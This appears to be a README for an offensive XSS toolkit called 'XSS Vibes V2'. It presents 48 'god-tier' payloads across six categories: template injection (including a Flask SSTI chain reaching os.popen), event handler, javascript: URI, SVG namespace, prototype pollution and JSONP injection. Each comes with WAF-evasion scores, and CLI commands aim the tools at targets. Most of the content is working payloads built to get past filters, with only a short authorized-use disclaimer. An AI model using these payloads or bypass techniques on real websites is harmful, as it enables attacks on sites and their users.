# 🔥 XSS Vibes V2 - Advanced XSS Categories Documentation

## 📋 Overview

This document describes the 6 new advanced XSS categories added to XSS Vibes V2. These categories contain god-tier and advanced-level payloads targeting modern web applications and frameworks.

**Total: 48 Advanced Payloads across 6 Categories**

---

## 🎯 Categories Overview

| Category | Payloads | Difficulty | Target |
|----------|----------|------------|---------|
| [Template Injection](#-1-template-injection) | 8 | **GOD TIER** | Template Engines, SSTI |
| [Event Handler Injection](#-2-event-handler-injection) | 8 | **ADVANCED** | Dynamic Events, DOM |
| [JavaScript URI Injection](#-3-javascript-uri-injection) | 8 | **ADVANCED** | Protocol Handlers, URLs |
| [innerHTML SVG Namespace](#-4-innerhtml-svg-namespace) | 8 | **GOD TIER** | SVG, Mixed Namespaces |
| [JavaScript Proto Pollution XSS](#-5-javascript-proto-pollution-xss) | 8 | **GOD TIER** | Prototype Pollution |
| [URL JS Context](#-6-url-js-context) | 8 | **ADVANCED** | Script Sources, JSONP |

---

## 🔥 1. Template Injection

**Category**: `template_injection`  
**Difficulty**: `god_tier_advanced`  
**Description**: Server-Side and Client-Side Template Injection leading to XSS

### 🎯 Target Contexts
- Mustache/Handlebars template engines
- AngularJS expressions
- Server-Side Template Injection (SSTI)
- DOM template rendering (client-side)

### 💀 Key Payloads

#### Mustache Constructor Chain
```javascript
{{constructor.constructor('alert(1)')()}}
```
- **Evasion Level**: 9/10
- **Bypasses**: template_filters, constructor_detection

#### DOM Template Import
```html
<template id="tpl"><img src=x onerror=alert(1)></template>
<script>
document.body.appendChild(document.importNode(document.querySelector('#tpl').content, true));
</script>
```
- **Evasion Level**: 8/10
- **Bypasses**: template_detection, dom_manipulation

#### Python Flask SSTI
```python
{{config.__class__.__init__.__globals__['os'].popen('echo alert(1)').read()}}
```
- **Evasion Level**: 10/10
- **Bypasses**: flask_filters, python_detection, ssti_filters

### 🔧 Usage Examples
```bash
# Test template injection payloads
xss-context /path/to/template.html --format json
python3 tools/test_advanced_categories.py template_injection
```

---

## ⚡ 2. Event Handler Injection

**Category**: `event_handler_injection`  
**Difficulty**: `advanced`  
**Description**: Dynamic event handler injection and manipulation

### 🎯 Target Contexts
- on* attributes (onclick, onmouseover)
- setAttribute abuse
- addEventListener with dynamic functions

### 💀 Key Payloads

#### setAttribute Abuse
```javascript
document.createElement('img').setAttribute('onerror','alert(1)');
```
- **Evasion Level**: 8/10
- **Bypasses**: dom_filters, setAttribute_detection

#### addEventListener Dynamic
```javascript
document.body.addEventListener('click', new Function('alert(1)'));
```
- **Evasion Level**: 9/10
- **Bypasses**: function_detection, event_listener_filters

#### CSS Animation Event
```html
<div style="animation:a 1s" onanimationend=alert(1)>
```
- **Evasion Level**: 8/10
- **Bypasses**: animation_filters, css_event_detection

### 🔧 Usage Examples
```bash
# Test event handler injection
xss-ai-domfuzz --contexts event_handlers --mutations dynamic_events
```

---

## 🌐 3. JavaScript URI Injection

**Category**: `javascript_uri_injection`  
**Difficulty**: `advanced`  
**Description**: JavaScript protocol handler abuse and URI injection

### 🎯 Target Contexts
- `<a href="javascript:...">`
- `window.location`, `window.open` using user input

### 💀 Key Payloads

#### Data URI + postMessage Hybrid
```html
<iframe src="data:text/html,<script>parent.postMessage('javascript:alert(1)','*')</script>">
```
- **Evasion Level**: 9/10
- **Bypasses**: data_uri_filters, postMessage_detection, iframe_filters

#### ES6 Dynamic Import
```javascript
import('/js/module.js?cb=alert(1)//').then(m=>m.default());
```
- **Evasion Level**: 9/10
- **Bypasses**: import_filters, es6_detection, dynamic_import_detection

#### Service Worker Registration
```javascript
navigator.serviceWorker.register('/sw.js?cb=alert(1)//')
```
- **Evasion Level**: 9/10
- **Bypasses**: serviceworker_filters, registration_detection

### 🔧 Usage Examples
```bash
# Test JavaScript URI injection
xss-ultimate -t example.com -w cloudflare -m god_tier
```

---

## 🖼️ 4. innerHTML SVG Namespace

**Category**: `innerhtml_svg_namespace`  
**Difficulty**: `god_tier_advanced`  
**Description**: SVG injection via innerHTML with namespace manipulation

### 🎯 Target Contexts
- SVG injection via innerHTML
- Mixed namespace trick to bypass filters

### 💀 Key Payloads

#### SVG foreignObject with XHTML Namespace
```html
<svg><foreignObject><div xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></div></foreignObject></svg>
```
- **Evasion Level**: 10/10
- **Bypasses**: foreignObject_filters, namespace_detection, xhtml_filters

#### Mixed Namespace SVG+XHTML
```javascript
document.body.innerHTML='<svg xmlns="http://www.w3.org/2000/svg"><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script></svg>';
```
- **Evasion Level**: 10/10
- **Bypasses**: mixed_namespace_filters, innerHTML_svg_detection

#### SVG set Element Dynamic Attribute
```html
<svg><set attributeName=onmouseover to=alert(1)>
```
- **Evasion Level**: 9/10
- **Bypasses**: svg_set_filters, attributeName_detection

### 🔧 Usage Examples
```bash
# Test SVG namespace injection
xss-ai-domfuzz --contexts svg,mixed_namespace --mutations namespace_bypass
```

---

## 🧬 5. JavaScript Proto Pollution XSS

**Category**: `javascript_proto_pollution_xss`  
**Difficulty**: `god_tier_advanced`  
**Description**: Prototype pollution leading to DOM clobbering and XSS

### 🎯 Target Contexts
- Prototype pollution → DOM clobbering → XSS
- `__proto__.onerror`, `constructor.prototype`

### 💀 Key Payloads

#### __proto__ onerror Pollution
```javascript
__proto__.onerror = alert; throw 1;
```
- **Evasion Level**: 10/10
- **Bypasses**: proto_detection, onerror_filters, pollution_detection

#### Constructor Prototype Pollution
```javascript
constructor.prototype.toString = function(){return 'alert(1)'}; eval({}+'');
```
- **Evasion Level**: 10/10
- **Bypasses**: constructor_detection, prototype_filters, eval_detection

#### DOM Clobbering via Form
```html
<form id=__proto__><input name=onerror value=alert(1)>
```
- **Evasion Level**: 9/10
- **Bypasses**: dom_clobbering_filters, form_pollution_detection

### 🔧 Usage Examples
```bash
# Test prototype pollution XSS
xss-context /path/to/app.js --contexts prototype_pollution
```

---

## 📡 6. URL JS Context

**Category**: `url_js_context`  
**Difficulty**: `advanced`  
**Description**: Script src constructed from query string and URL context injection

### 🎯 Target Contexts
- Script src constructed from query string
- Example: `<script src="/js/lib.js?cb=alert(1)//"></script>`

### 💀 Key Payloads

#### JSONP Callback Injection
```html
<script src="/api/data?callback=alert(1)//"></script>
```
- **Evasion Level**: 8/10
- **Bypasses**: jsonp_filters, callback_detection

#### Dynamic Script Construction
```javascript
var s=document.createElement('script');s.src='/js/lib.js?cb='+encodeURIComponent('alert(1)//');document.body.appendChild(s);
```
- **Evasion Level**: 9/10
- **Bypasses**: dynamic_script_detection, createElement_filters

#### Fetch Script Injection
```javascript
fetch('/api/script?cb=alert(1)//').then(r=>r.text()).then(eval);
```
- **Evasion Level**: 9/10
- **Bypasses**: fetch_filters, eval_detection, response_eval_detection

### 🔧 Usage Examples
```bash
# Test URL JS context injection
xss-polyglot --category url_js_context --count 5
```

---

## 🚀 Quick Start Guide

### 1. Testing Individual Categories
```bash
# Test specific category
python3 tools/test_advanced_categories.py template_injection

# Test all new categories
python3 tools/test_advanced_categories.py
```

### 2. Using with XSS Vibes Tools
```bash
# AI Context Extractor with new categories
xss-context /path/to/app --format json

# AI DOM Fuzzer with advanced contexts
xss-ai-domfuzz --contexts template_injection,prototype_pollution

# Generate specific category payloads
xss-dpe generate --category template_injection --count 10
```

### 3. Integration Examples
```bash
# Ultimate tester with god-tier mode
xss-ultimate -t target.com -m god_tier

# Quick test with advanced payloads
xss-quick target.com --advanced-categories
```

---

## 📁 File Structure

```
xss_vibes/data/categories/
├── template_injection.json              # 8 SSTI & template payloads
├── event_handler_injection.json         # 8 dynamic event payloads  
├── javascript_uri_injection.json        # 8 JavaScript URI payloads
├── innerhtml_svg_namespace.json         # 8 SVG namespace payloads
├── javascript_proto_pollution_xss.json  # 8 prototype pollution payloads
└── url_js_context.json                  # 8 URL context payloads

xss_vibes/data/
├── payloads_enhanced.json               # Combined enhanced payloads
└── payloads.json                        # Original payload collection
```

---

## ⚠️ Security Considerations

### Testing Guidelines
1. **Only test on authorized targets**
2. **Use in controlled environments**
3. **Understand payload impact before execution**
4. **Follow responsible disclosure practices**

### Payload Responsibility
- These are **advanced/god-tier** payloads designed for security research
- **High evasion levels** (8-10/10) can bypass modern WAFs
- **Prototype pollution** payloads can affect entire applications
- **Template injection** can lead to RCE in some contexts

---

## 📚 References

### Template Injection
- [Server-Side Template Injection (OWASP)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection)
- [Client-Side Template Injection](https://portswigger.net/research/xss-in-hidden-input-fields)

### Prototype Pollution
- [Prototype Pollution Vulnerabilities](https://portswigger.net/research/prototype-pollution-the-dangerous-and-underrated-vulnerability-class)
- [DOM Clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)

### SVG Security
- [SVG Security Cheatsheet](https://github.com/cure53/DOMPurify/wiki/Forbid-SVG)
- [Mixed Content and Namespaces](https://developer.mozilla.org/en-US/docs/Web/SVG/Namespaces_Crash_Course)

---

## 🔧 Contributing

To add new payloads to these categories:

1. Edit the respective JSON file in `xss_vibes/data/categories/`
2. Follow the payload structure:
```json
{
  "name": "payload_name",
  "payload": "actual_payload_code", 
  "description": "Clear description",
  "context": ["context1", "context2"],
  "encoding": "none|url|base64",
  "evasion_level": 1-10,
  "waf_bypass": ["filter1", "filter2"]
}
```
3. Test with `python3 tools/test_advanced_categories.py category_name`
4. Update this documentation

---

## 📈 Version History

- **v2.0** (2025-07-30): Initial release of 6 advanced categories
  - 48 new advanced payloads
  - Integration with AI tools
  - Enhanced testing framework

---

**Created**: July 30, 2025  
**Version**: 2.0  
**Author**: XSS Vibes V2 Team  
**License**: Educational/Research Use Only
